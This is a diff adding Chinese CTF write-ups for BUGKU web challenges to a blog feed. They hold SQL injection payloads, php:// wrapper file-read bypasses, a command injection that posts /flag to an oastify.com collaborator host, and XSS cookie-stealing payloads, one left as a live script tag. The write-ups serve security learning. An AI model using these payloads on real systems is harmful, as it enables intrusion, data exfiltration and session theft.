@@ -4478,6 +4478,113 @@
 <p>有变化，继续分析，然后我发现是重复的，没办法，只能写脚本了</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://114.67.175.224:16522/&quot;</span></span><br><span class="line">s=requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    r=s.get(url)<span class="comment">#发起一个 GET 请求，获取指定 URL 的响应，并将响应存储在变量 r 中</span></span><br><span class="line">    header_flag=r.headers[<span class="string">&#x27;flag&#x27;</span>]<span class="comment">#从响应的头信息中获取名为 &#x27;flag&#x27; 的值，并将其存储在 header_flag 中。</span></span><br><span class="line">    header_flag=base64.b64decode(header_flag).decode()</span><br><span class="line"></span><br><span class="line">    value=header_flag.split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">1</span>]<span class="comment"># 将字符串 header_flag 按空格分割，然后取最后一个部分作为 value。</span></span><br><span class="line">    v=base64.b64decode(value).decode(<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment"># 对 Base64 编码的 value 进行解码，然后将其转换为 UTF-8 编码的字符串。</span></span><br><span class="line">    response=s.post(url,data=&#123;<span class="string">&#x27;margin&#x27;</span>:v&#125;)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+<h1 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$ac</span>))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fn</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$ac</span> === <span class="variable">$f</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;This is flag:&quot;</span> .<span class="string">&quot; <span class="subst">$flag</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>考查的是file_get_contents()函数，不会的自行百度哈</p>
+<p>大致意思就是要上传 ac和fn两个参数</p>
+<p>且ac的值等于fn文件内容的值,但是这里的话是没法满足判断句的，那我们试着绕过一下这个判断句</p>
+<p>file_get_contents()绕过我们用伪协议进行绕过</p>
+<p>payload:</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126140411099.png" alt="image-20241126140411099"></p>
+<p>为什么这样做呢?</p>
+<p>**<code>php://input</code>**作用：执行POST数据中的php代码</p>
+<p>用**<code>php://input</code>**绕过file_get_contents()</p>
+<p>1.将要GET的参数?xxx&#x3D;php:&#x2F;&#x2F;input</p>
+<p>2.用post方法传入想要<code>file_get_contents()</code>函数返回的值</p>
+<h1 id="成绩查询"><a href="#成绩查询" class="headerlink" title="成绩查询"></a>成绩查询</h1><p>用1和1’测试闭合方式，发现是单引号闭合</p>
+<p>用order by测试回显字段数发现字段数是4</p>
+<p>用union select查看回显位置</p>
+<p>-1’ union select 1,2,3,4#</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126141535282.png" alt="image-20241126141535282"></p>
+<p>既然没有过滤那就用联合查询进行注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询数据库名</span><br><span class="line">-1&#x27; union select 1,database(),3,4#</span><br><span class="line">查询表名</span><br><span class="line">-1&#x27; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;skctf&#x27;),3,4#</span><br><span class="line">查询表中列名</span><br><span class="line">-1&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;fl4g&#x27;),3,4#</span><br><span class="line">查询列中数据</span><br><span class="line">-1&#x27; union select 1,(select group_concat(skctf_flag)from skctf.fl4g),3,4#</span><br></pre></td></tr></table></figure>
+
+<h1 id="no-select"><a href="#no-select" class="headerlink" title="no select"></a>no select</h1><p>猜测是开始有过滤了，而且过滤的还是select</p>
+<p>我试了一下万能密码发现能打通</p>
+<p>1’ or 1&#x3D;1#</p>
+<h1 id="login2"><a href="#login2" class="headerlink" title="login2"></a>login2</h1><p>测试之后发现都是登录失败，抓包看看有没有什么线索</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126143402053.png" alt="image-20241126143402053"></p>
+<p>发现一个tip很显眼啊，拿去解码一下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username,password FROM admin WHERE username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$row</span>) &amp;&amp; <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的话是需要让row中password的md5值等于password，但是这里的话我们是不知道里面有哪些用户和密码的，这时候有个思路就是</p>
+<p>通过输入不存在的用户构造新的用户和密码去进行登录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27; union select 1,&#x27;md5(123)&#x27;#&amp;password=123  </span><br><span class="line">这里将123的md5值换进去就行</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126145315853.png" alt="image-20241126145315853"></p>
+<p>这里可以看到一个index.php，我们访问一下</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126145257655.png" alt="image-20241126145257655"></p>
+<p>这里我一开始也很懵，一点提示也没得，后面看了粽子师傅的wp才知道这个是无回显的延时注入</p>
+<p>1;curl -X POST -F xx&#x3D;@&#x2F;flag  <a href="http://yacgwxvhy7jd2crte67tuxg8lzrqfg35.oastify.com/">http://yacgwxvhy7jd2crte67tuxg8lzrqfg35.oastify.com</a></p>
+<p>这里换成bp里面服务器collarborator的地址，然后进行poll now就行了</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126145916680.png" alt="image-20241126145916680"></p>
+<p>或者也可以直接写文件</p>
+<p>payload:123 | cat &#x2F;flag &gt;1.php<br>查看 flag文件并输出到1.php里边<br>1.php可以在网站子目录查看内容拿到flag</p>
+<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>基于布尔的sql盲注</p>
+<p>先fuzz一下，当我输入admin的话显示的是password错误</p>
+<h1 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h1><p>输入正常的xss语句看看效果</p>
+<p>&lt;script&gt;alert(‘xss’)&lt;&#x2F;script&gt;</p>
+<p>发现括号被转化成|</p>
+<p>扫目录发现了两个文件</p>
+<p>&#x2F;admin.php</p>
+<p>&#x2F;db.sql</p>
+<p>admin.php是一个登录界面，但是这个db.sql访问是404，不知道是环境问题还是什么，所以只好从大佬的wp上摘下来了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Host: localhost  (Version: 5.5.53)</span><br><span class="line"># Date: 2019-08-04 16:13:22</span><br><span class="line"># Generator: MySQL-Front 5.3  (Build 4.234)</span><br><span class="line"> </span><br><span class="line">/*!40101 SET NAMES utf8 */;</span><br><span class="line"> </span><br><span class="line">#</span><br><span class="line"># Structure for table &quot;text&quot;</span><br><span class="line">#</span><br><span class="line"> </span><br><span class="line">CREATE DATABASE xss DEFAULT CHARACTER SET utf8;</span><br><span class="line">use xss; </span><br><span class="line"> </span><br><span class="line">DROP TABLE IF EXISTS `text`;</span><br><span class="line">CREATE TABLE `text` (</span><br><span class="line">  `Id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `text` varchar(255) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`Id`)</span><br><span class="line">) ENGINE=MyISAM DEFAULT CHARSET=utf8;</span><br><span class="line"> </span><br><span class="line">#</span><br><span class="line"># Data for table &quot;text&quot;</span><br><span class="line">#</span><br><span class="line"> </span><br><span class="line">/*!40000 ALTER TABLE `text` DISABLE KEYS */;</span><br><span class="line">/*!40000 ALTER TABLE `text` ENABLE KEYS */;</span><br><span class="line"> </span><br><span class="line">#</span><br><span class="line"># Structure for table &quot;user&quot;</span><br><span class="line">#</span><br><span class="line"> </span><br><span class="line">DROP TABLE IF EXISTS `user`;</span><br><span class="line">CREATE TABLE `user` (</span><br><span class="line">  `Id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(255) DEFAULT NULL,</span><br><span class="line">  `password` varchar(255) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`Id`)</span><br><span class="line">) ENGINE=MyISAM DEFAULT CHARSET=utf8;</span><br><span class="line"> </span><br><span class="line">#</span><br><span class="line"># Data for table &quot;user&quot;</span><br><span class="line">#</span><br><span class="line"> </span><br><span class="line">/*!40000 ALTER TABLE `user` DISABLE KEYS */;</span><br><span class="line">INSERT INTO `user` VALUES (1,&#x27;admin&#x27;,&#x27;011be4d65feac1a8&#x27;);</span><br><span class="line">/*!40000 ALTER TABLE `user` ENABLE KEYS */;</span><br></pre></td></tr></table></figure>
+
+<p>底下的话就是登录的账号密码，</p>
+<p>登录后看到了我刚刚传入的(括号，那我们返回去注入一下xss语句</p>
+<p>&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</p>
+<p>登录后可以看到有弹窗</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126153642287.png" alt="image-20241126153642287"></p>
+<p>那我们看一下admin的cookie中有没有flag</p>
+<script>alert(document.cookie)</script>
+
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126155017757.png" alt="image-20241126155017757"></p>
+<p>刚好admin的cookie里面就有flag，把前后的编码换成花括号就行了</p>
+<h1 id="留言板1"><a href="#留言板1" class="headerlink" title="留言板1"></a>留言板1</h1><p>&lt;script&gt;document.location.href&#x3D;”http:&#x2F;&#x2F;[ip]&#x2F;xss.php?cookie&#x3D;”+document.cookie</script></p>
+<p>发现script,http被过滤,还有长度限制</p>
+<p>不过好像我的服务器接收不到数据，也不知道为啥，应该是平台的环境问题</p>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p><img src="/./../image/achieve/202411/BUGKU/image-20241126160635726.png" alt="image-20241126160635726"></p>
+<p>看到那个click就点了，第一眼感觉像是任意文件读取，但是单单的file&#x3D;index.php是没办法获取源代码的，我们需要用伪协议去读取源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取源码代码</span><br><span class="line">?file=php://filter/resource=xxx.php</span><br><span class="line"></span><br><span class="line">通常获取源代码时，伪协议将xxx.php当文件执行，</span><br><span class="line">使得很多信息往往不能直接显示在浏览器页面上，通常使用base64编码后再显示</span><br><span class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>页面回显了base64编码</p>
+<p>解码后得到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-web&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$_GET</span>[file])&#123;<span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;</span>;&#125;</span><br><span class="line">	<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag:flag&#123;f81f50efef059669689aa4c5b9831c7a&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>不过我发现直接读flag也是可以读到了，?file&#x3D;&#x2F;flag直接就能拿到flag了</p>
+<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p>题目提示是cookie欺骗，直接看cookie发现了一个fla，拿去提交发现是假的flag</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126161220352.png" alt="image-20241126161220352"></p>
+<p>在url中有a2V5cy50eHQ&#x3D;，拿去解码发现是一个keys.txt，我们访问一下发现和刚刚的页面内容是一样的，猜测是这个网页访问了一个文本文档，然后我就试着访问一下flag.txt和flag.php发现什么都没有，我就猜测了一下index.php</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126162309858.png" alt="image-20241126162309858"></p>
+<p>修改了line发现有不同的内容，后面访问了n个line后才拿到完整的源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable">$line</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>])?<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>) <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);</span><br><span class="line"><span class="variable">$file_list</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$file_list</span>[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file</span>, <span class="variable">$file_list</span>))&#123;</span><br><span class="line"><span class="variable">$fa</span> = <span class="title function_ invoke__">file</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fa</span>[<span class="variable">$line</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看到源码就好做了，设置cookie里面的margin等于margin然后访问keys.php</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126163042405.png" alt="image-20241126163042405"></p>
+<h1 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never_give_up"></a>never_give_up</h1><p>在源码中发现了1p.html，但是访问了会跳转到bugku的官方，那我们抓包拦截一下</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126163517748.png" alt="image-20241126163517748"></p>
+<p>发现了很多被注释掉的语句，这是多层解码</p>
+<p>第一层</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126164155012.png" alt="image-20241126164155012"></p>
+<p>第二层</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126164215358.png" alt="image-20241126164215358"></p>
+<p>第三层</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126164233124.png" alt="image-20241126164233124"></p>
+<p>最后得到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;;if(!<span class="subst">$_GET</span>[&#x27;id&#x27;])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	header(&#x27;Location: hello.php?id=1&#x27;);</span></span><br><span class="line"><span class="string">	exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$id</span>=<span class="subst">$_GET</span>[&#x27;id&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$a</span>=<span class="subst">$_GET</span>[&#x27;a&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$b</span>=<span class="subst">$_GET</span>[&#x27;b&#x27;];</span></span><br><span class="line"><span class="string">if(stripos(<span class="subst">$a</span>,&#x27;.&#x27;))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	echo &#x27;no no no no no no no&#x27;;</span></span><br><span class="line"><span class="string">	return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$data</span> = @file_get_contents(<span class="subst">$a</span>,&#x27;r&#x27;);</span></span><br><span class="line"><span class="string">if(<span class="subst">$data</span>==&quot;</span>bugku is a nice plateform!<span class="string">&quot; and <span class="subst">$id</span>==0 and strlen(<span class="subst">$b</span>)&gt;5 and eregi(&quot;</span><span class="number">111</span><span class="string">&quot;.substr(<span class="subst">$b</span>,0,1),&quot;</span><span class="number">1114</span><span class="string">&quot;) and substr(<span class="subst">$b</span>,0,1)!=4)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	<span class="subst">$flag</span> = &quot;</span>flag&#123;***********&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	print &quot;</span><span class="keyword">never</span> <span class="keyword">never</span> <span class="keyword">never</span> give up !!!<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>条件</strong></p>
+<ul>
+<li><strong>变量 $id 弱等于整型数 0</strong></li>
+<li><strong>变量 $b 的长度大于 5</strong></li>
+<li><strong>字符串 1114 要与字符串 111 连接变量 $b 的第一个字符构成的正则表达式匹配</strong></li>
+<li><strong>变量 $b 的第一个字符弱不等于整型数 4</strong></li>
+<li><strong>变量 $data 弱等于字符串 bugku is a nice plateform!</strong></li>
+</ul>
+<p><code>reg()</code> 函数或 <code>eregi()</code> 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据。</p>
+<p>绕过file_get_contents()函数用前面的方法就行，所以我们用伪协议去做</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126165219445.png" alt="image-20241126165219445"></p>
 ]]></content>
       <categories>
         <category>赛题wp</category>
